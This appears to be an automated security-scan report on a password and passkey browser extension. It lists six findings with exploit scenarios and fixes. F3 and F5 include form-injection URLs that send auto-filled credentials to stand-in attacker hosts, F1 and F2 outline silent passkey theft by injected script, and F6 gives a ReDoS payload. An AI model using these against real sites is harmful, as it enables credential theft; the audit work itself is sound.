# Claude Security results

Whole-repository scan of `risu729/pateat` at revision `88837458c6a9` (`main`), mode
`scan`, no scope, focus `attack-surface`, run on 2026-10-16 starting 13:26 UTC at
`medium` effort. Six findings survived verification: five MEDIUM and one LOW. They
describe four distinct problems, because two pairs were reported independently at
different lines: F1 and F2 are the same passkey presence issue, and F3 and F5 are the
same form-destination issue. Nothing in this scan executed the repository's code. Every
finding comes from reading it.

## Coverage

The inventory split the 622 tracked files into 16 components (sized for about 25 files
each, at most 24 kept): `api-routes`, `api-auth-access`, `api-data-recipes`,
`api-web-ui`, `ext-background-messaging`, `ext-passkeys-core`, `ext-passkeys-page`,
`ext-login-content`, `ext-vault-crypto`, `ext-service-client`, `ext-ui-diagnostics`,
`bitwarden-crypto-auth`, `bitwarden-vault-items`, `contracts`, `inference` and
`ci-build-scripts`. The completeness check ran and passed: all eight top-level
directories (`.github`, `.mise`, `apps`, `docs`, `packages`, `scripts`, `services`,
`tests`) were either scanned or explicitly skipped.

Areas deliberately not examined, with the inventory's reasons:

- `docs`: "Documentation and ADRs only, no executable code".
- `tests`: "Test suites, Playwright specs and fixtures, not production code".
- `services/api/migrations/meta` and `services/api/test`: "Generated drizzle snapshots
  and API test files/fixtures".
- `services/api/migrations/0005` to `0015`: "Incremental schema migrations, low-risk DDL
  covered by schema review".

With focus set to `attack-surface`, test files inside components were background, not
targets. The memory-and-unsafe category was pruned for every component (TypeScript code
with no unsafe memory operations). 50 researchers were dispatched and all 50 returned.
The panel finished in one verification run, with no candidates lost or handed on.

What the researchers report not reading: in every component, the files declared not
reached are mostly `*.test.ts` files left as background. In addition, `node_modules` was
not installed in the scan tree, so conclusions about Hono's JWT verification and HTML
escaping, `cbor2`, `valibot` and `@bitwarden/sdk-internal` rest on how the code uses
them, not on reading the libraries. Parts of very large files were read only around the
paths that mattered: `apps/extension/src/login/runtime.ts` (identify, admission and
passkey hand-off), `apps/extension/src/observation/extract.ts` and
`apps/extension/src/page/account-list.ts`. Checked against the tracked files inside the
components, 257 of 383 were read to a conclusion, 105 lie under a declared not-reached
path, and 21 were accounted for by no researcher. All 21 are test files: 9 under
`apps/extension/src/login/` (for example `runtime.test.ts`, `badge.test.ts`), 2 under
`apps/extension/src/observation/` and 10 under `apps/extension/src/page/`. 239 files lie
outside every component: the skipped areas above plus root files.

## Findings

<!-- rumdl-disable-next-line MD013 -->
### F1 — Passkey assertions are signed with UP and UV set and no user interaction, so any script in an RP origin can silently get a verified assertion (MEDIUM, confidence medium)

**Impact.** Any script running on a relying party's origin can get a silent,
user-verified (UV=1) passkey login to the victim's account and complete it on the
attacker's own device. Passkeys' user-presence and user-verification guarantees are
lost, and the relying party is told verification happened when it did not.

**Where.** `apps/extension/src/passkeys/assertion.ts:42` in `createPasskeyAssertion`

**What.** A page-posted get request reaches the signer. The relay accepts any
same-window message (`relay.ts:72`), and so does any script calling
`navigator.credentials.get`. The UP flag is hard-coded, and UV comes from
`INITIAL_PASSKEY_POLICY` (presence `always`, verification `always`). Production passes
no `policy`, so the user-activation gate at `request.ts:196` never applies, and the
Worker signs the page-chosen challenge with no presence check, verification or prompt.

**Exploit scenario.** The attacker starts a passkey login at `https://victim.example`
from their own machine and gets the server challenge. Script they injected into the
victim's page calls `navigator.credentials.get` with that challenge,
`rpId: 'victim.example'` and the victim's credential ID in `allowCredentials`. The
MAIN-world wrapper relays it, the background admits it without user activation,
`selectPasskey` finds the one listed credential, and the Worker signs with UP, UV, BE
and BS set. The ADR 0021 re-prompt does not apply because `allowCredentials` is not
empty. No window or prompt appears; the script sends the assertion to the attacker, who
completes the login as the victim. A native WebAuthn request would need the user to
interact with the browser's prompt.

**Preconditions.**

- The attacker can run script in a top-level document of the RP origin, or of a
  subdomain that may claim the RP ID (XSS, a compromised third-party script, or a
  user-content subdomain not on the PSL).
- The victim's vault is unlocked (automatic unlock per ADR 0006) and holds one matching
  passkey for the RP ID, or a site default. A request with a non-empty
  `allowCredentials` also signs silently in a tab where Pateat signed before.

**Fix.** This behaviour is an owner-chosen deviation recorded in
`docs/adr/0007-existing-passkey-assertions.md`, so it is an accepted risk to revisit
rather than a new defect. To reduce it: default to presence `activation` and
verification `never`, or require a Pateat-owned confirmation in the extension chooser
window before each assertion; never set UV without verifying the user; make unattended
signing a per-site opt-in instead of the global default.

**Verification.** 2/3 lens verifiers confirmed. The REACHABILITY voter rejected it
because only script in the relying party's own top-level document can make the request.

<!-- rumdl-disable-next-line MD013 -->
### F2 — Any script on an HTTPS page can make Pateat silently sign a passkey assertion with UP and UV set, with no gesture or user verification (MEDIUM, confidence high)

**Impact.** Script in any top-level HTTPS page whose origin may use the RP ID (XSS or a
compromised third-party script) can quietly get a valid, user-verified assertion over a
challenge it chooses. That is account takeover at the relying party from an
attacker-controlled session, and it also passes step-up flows that require
`userVerification: "required"`. Silent probes with one credential ID at a time also
reveal which of the site's credential IDs the user's vault holds.

**Where.** `apps/extension/src/passkeys/request.ts:196` in `admitGetRequest`

**What.** The page sends the get request through the wrapper (`page.ts:394`) or by
posting straight to the relay (`relay.ts:121`), and the relay posts the signed assertion
back to the page (`relay.ts:66`). The production runtime has no policy option
(`entrypoints/background.ts:309-326`), so `INITIAL_PASSKEY_POLICY` applies with presence
and verification both `always`. The only presence gate, at `request.ts:196`, therefore
never runs, the relay's `userActivation` value is ignored, and `assertion.ts:42-43` sets
UP=1 and UV=1 although the user did nothing. This is the same root cause as F1, reported
at the admission check.

**Exploit scenario.** An attacker has script on `https://example.com` through stored XSS
or a malicious analytics script. The script fetches a login challenge the attacker's
server got from example.com and calls
`navigator.credentials.get({publicKey: {challenge, allowCredentials: []}})`, or posts
`{channel: "pateat.passkey.v1", type: "get", id, request}` straight to the isolated
relay. If the unlocked vault holds one discoverable passkey for example.com, or a site
default, the background signs at once (`runtime.ts:514`) and no window opens. The script
sends the assertion to the attacker's server, which finishes the WebAuthn login as the
victim.

**Preconditions.**

- Attacker-controlled JavaScript runs in a top-level HTTPS document whose origin can use
  the target RP ID.
- The vault is unlocked and holds exactly one matching passkey for the RP ID, or a site
  default for that origin.
- The site is not excluded in Pateat settings.

**Fix.** Do not sign without proof of user presence. Make the production policy presence
`activation` at minimum, so the relay's isolated-world user-activation gate applies. Set
UV only after a real local verification step, or clear it and delegate requests that
require user verification. Better, ask the user to confirm on first use per origin, or
in Pateat's own window, before signing. ADR 0007 (2026-10-10) records this as a
deliberate departure from the WebAuthn ceremony, with a per-site setting planned for
phase 3.

**Verification.** 3/3 lens verifiers confirmed.

<!-- rumdl-disable-next-line MD013 -->
### F3 — Vault credentials are filled and auto-submitted without checking where the form sends them (form action / formaction) (MEDIUM, confidence high)

**Impact.** Zero-click theft of the site's vault credentials (username and password, or
TOTP and hidden fields bound to the recipe) through a markup-only injection that,
without Pateat, would still need the user to type the password.

**Where.** `apps/extension/src/login/content.ts:1112` in the `login.execute` click step
of `installLoginContent`

**What.** The content script and worker decide whether to release vault secrets using
only the document's origin and path (`content.ts:799-803`, `identify()` in
`runtime.ts`). Nothing checks where the credentials will be submitted: `form.action`,
the click target's `formaction` and `<base href>` are never read. The secret is written
into a page-controlled form (`content.ts:998`, `content.ts:1022`) and then the recipe's
submit target is clicked (`content.ts:1112`), so markup on the page decides where the
password goes.

**Exploit scenario.** The victim has a Bitwarden item for `https://victim.com`, and the
site's `/login` reflects an error parameter as HTML. The attacker sends
`https://victim.com/login?msg=<form action=https://evil.example/c>`. While the parser's
form element pointer is set, it ignores the real `<form>` start tag, so the real
username and password inputs and the submit button now belong to the attacker's form.
The cached recipe's targets still match exactly one element each, so the readiness and
secret checks pass. Pateat fills the username and password and clicks submit, and the
browser POSTs them to `evil.example` with no user action. In a variant, an injected fake
password form on another path of the origin makes the page qualify for automatic recipe
generation, and the generated recipe fills and submits the password into it.

**Preconditions.**

- The site has an HTML injection that allows `<form>`, `formaction` or `<base>` markup
  (no script needed).
- The victim has a matching vault item, with a cached recipe for the injected path or
  recipe generation connected.
- The victim opens the attacker's link.

**Fix.** Before filling secrets and before the submitting click, resolve the effective
submission URL: the button's `formAction` if set, else `form.action`. For a form-less
click, refuse, or require the step not to submit. Refuse when that URL's origin differs
from the document origin, or at least when the item's URI match does not cover it, and
when it differs from the action recorded when the recipe was generated or cached.

**Verification.** 3/3 lens verifiers confirmed.

<!-- rumdl-disable-next-line MD013 -->
### F4 — Opaque-origin (CSP/iframe sandboxed) documents are treated as their URL's origin, so vault secrets reach sandboxed user content (MEDIUM, confidence high)

**Impact.** Credential theft across an isolation boundary the site set up on purpose:
sandboxed, attacker-controlled content gets the site's vault password and other bound
fields.

**Where.** `apps/extension/src/login/runtime.ts:2040` in `identify`

**What.** `identify()` takes the document origin from the URL in `sender.url`
(`runtime.ts:2033`, `runtime.ts:2040`) and never compares it to the browser-reported
`sender.origin`. In the content script the only origin check (`content.ts:800`) compares
against `location.origin`, which is the URL's origin even when the document's real
origin is opaque. The passkey bridge does reject this case (`passkeys/runtime.ts:201`
requires `URL.parse(sender.url)?.origin === sender.origin`), but the login path has no
such check, so a page the site isolates with a CSP `sandbox` header is treated as the
site itself for URI matching, generation and filling.

**Exploit scenario.** `victim.com` serves user-uploaded HTML from its own host under
`Content-Security-Policy: sandbox allow-scripts`, so uploads run in an opaque origin.
The attacker uploads a page with a visible password form that listens for input events.
When the victim opens it, Pateat announces the document as `https://victim.com`, finds
the victim.com vault item, offers the page for automatic recipe generation and runs the
generated recipe. The content-side check passes because `location.origin` is
`https://victim.com`, and the password is typed into the attacker's input, where the
sandboxed script reads it and sends it away.

**Preconditions.**

- The site serves attacker-controlled HTML on its own host under CSP sandbox
  (`allow-scripts`, or `allow-forms` for a form-post variant).
- The victim has a vault item matching the site, and recipe generation is connected.
- The victim opens the uploaded page.

**Fix.** In `identify()`, require `sender.origin` to be a string equal to
`new URL(sender.url).origin`, as `senderOrigin()` in `passkeys/runtime.ts` already does,
and return undefined otherwise. In the content script, compare `self.origin` (the
effective origin) rather than `location.origin` with the operation's document origin
before filling.

**Verification.** 3/3 lens verifiers confirmed.

<!-- rumdl-disable-next-line MD013 -->
### F5 — Vault credentials are auto-filled and auto-submitted without checking where the form sends them (form action, formaction, base href) (MEDIUM, confidence high)

**Impact.** The saved site password, with the username, hidden fields or TOTP code, is
sent to an attacker-controlled origin with no user action. The user may never have typed
or seen this password.

**Where.** `apps/extension/src/login/content.ts:1112` in the `login.execute` click step
of `installLoginContent`

**What.** The page's DOM decides which form owns the filled inputs and where that form
submits. The executor fills vault passwords into those inputs (`content.ts:998`,
`content.ts:1022`) and then clicks the submit control (`content.ts:1112`) without
comparing `form.action`, the button's `formAction` or the document base URL with the
item's origin. This is the same root cause as F3, reported independently; it adds the
`<base href>` variant and the CSP `form-action` precondition.

**Exploit scenario.** `bank.example`'s login page reflects a query parameter as HTML;
its CSP blocks scripts but sets no `form-action`. The user has a Bitwarden item for
`bank.example` and a cached recipe that fills `#user` and `#pass` and clicks `#login`.
The attacker sends
`https://bank.example/login?msg=<div><form action=https://attacker.example/c method=post></div>`.
The parser keeps the injected form as its form element pointer and ignores the real
`<form>` start tag, so the real inputs and button are owned by the attacker's form while
their ids, types and path are unchanged. Pateat fills the username and password and the
click natively POSTs them to `attacker.example` (matched logins run without a prompt,
ADR 0001). An injected `<base href>` works the same way when the real form's action is
relative.

**Preconditions.**

- The site has an HTML-injection flaw on its login page (reflected or stored); no script
  execution is needed.
- The site does not restrict form submissions with a CSP `form-action` directive.
- The user has a matching vault item and an active recipe for the origin, so login runs
  automatically.
- The victim opens the attacker's URL or views the stored injection.

**Fix.** Before filling secrets and before any submitting click, resolve the submission
destination (the clicked button's `formAction` if set, otherwise the owning form's
`action`, against the document's base URL). Refuse when its origin, or at least its
registrable domain, differs from the item's or document's origin or from the origin
recorded when the recipe was generated or cached. Also refuse when the inputs' form
owner is not their ancestor `<form>`, or when a `<base href>` points to another origin.
Record the expected action origin in the recipe so legitimate cross-origin sign-in forms
can be allowed explicitly.

**Verification.** 3/3 lens verifiers confirmed.

<!-- rumdl-disable-next-line MD013 -->
### F6 — Quadratic-time regex /=+$/ on a decrypted passkey string of up to about 786K characters stalls the crypto Worker (LOW, confidence high)

**Impact.** Availability only. The crypto Worker for that connection makes no progress
for up to 30 seconds and is then terminated, ending the unlocked vault session. Passkey,
fill and catalog operations for the connection fail until it is reopened, and the
attacker's item makes this repeatable. No secret is disclosed or modified.

**Where.** `packages/bitwarden/src/passkeys.ts:69` in `decodeBitwardenBase64`

**What.** A vault-stored passkey `credentialId`, `userHandle` or `keyValue` is
controlled by whoever can write a cipher into the victim's vault. The only check before
the sink is a 1,400,000-character cap, and the unanchored `/=+$/u` replace backtracks
quadratically in V8 on a long run of `=` followed by any other character.

**Exploit scenario.** An organization member with write access to a collection shared
with the victim, on a server that accepts large encrypted passkey fields (for example
self-hosted Vaultwarden), creates a login item whose passkey `credentialId` is `b64.`
followed by about 700,000 `=` characters and then `A`, with an rpId the victim uses.
When the victim opens site accounts on that origin, or a passkey sign is attempted,
`findStoredPasskeys` reaches `decodeBitwardenBase64`, and about 2.5e11 backtracking
steps block the Worker until the offscreen supervisor kills it at 30 seconds. This
repeats every time the lookup runs.

**Preconditions.**

- The attacker can place a cipher in the victim's vault (organization membership with
  collection write access, or a hostile server able to supply an organization key).
- The server accepts a passkey field whose encrypted form is hundreds of KB. The
  official Bitwarden server likely caps encrypted string lengths; this was not verified.
- The item's rpId matches an RP ID queried for an origin the victim uses.
- V8's backtracking regex engine is in use without the experimental linear-time fallback
  (Chrome's default; not verified by execution).

**Fix.** Strip padding without a backtracking regex, for example by scanning from the
end for at most two `=` characters, or reject the value up front unless it matches an
anchored linear pattern such as `/^[A-Za-z0-9+/_-]*={0,2}$/u`. Also bound `credentialId`
and `userHandle` to their WebAuthn sizes (about 1366 and 88 base64 characters) in the
view schema before any decoding.

**Verification.** 3/3 lens verifiers confirmed.

## What was verified

Seven candidates came out of 50 researcher passes and went to a three-lens adversarial
panel (REACHABILITY, IMPACT, DEFENSES), 21 votes in all. Each voter worked from the code
and was told to reject the finding unless it could confirm a complete path. Six
candidates survived: F2 to F6 unanimously and F1 by two votes to one. One candidate was
rejected 0/3 and is not reported. No severity was lowered by the panel. Nothing was
executed: these are findings from reading the code, not demonstrated exploits. The
verification status is the one `render_report.py` stamps from the vote record.
